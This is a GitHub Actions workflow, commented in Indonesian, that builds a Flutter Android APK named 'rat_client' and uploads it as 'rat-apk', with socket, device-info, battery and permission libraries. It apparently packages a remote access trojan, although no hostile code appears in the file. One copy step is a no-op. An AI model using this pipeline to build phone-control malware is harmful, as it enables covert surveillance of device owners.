name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v3
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          flutter-version: '3.19.0'

      # 1. Download kerangka project Flutter yang sudah V2
      - name: Download Flutter Template
        run: |
          cd /tmp
          flutter create --platforms=android --org com.example rat_client
          cp -r /tmp/rat_client/android ./android
          cp -r /tmp/rat_client/ios ./ios

      # 2. Timpa main.dart kamu
      - name: Overwrite Main Dart
        run: cp lib/main.dart lib/main.dart

      # 3. Tambah dependencies
      - name: Add Dependencies
        run: flutter pub add socket_io_client device_info_plus battery_plus permission_handler

      # 4. Build APK
      - name: Build APK
        run: flutter build apk --release

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: rat-apk
          path: build/app/outputs/flutter-apk/app-release.apk
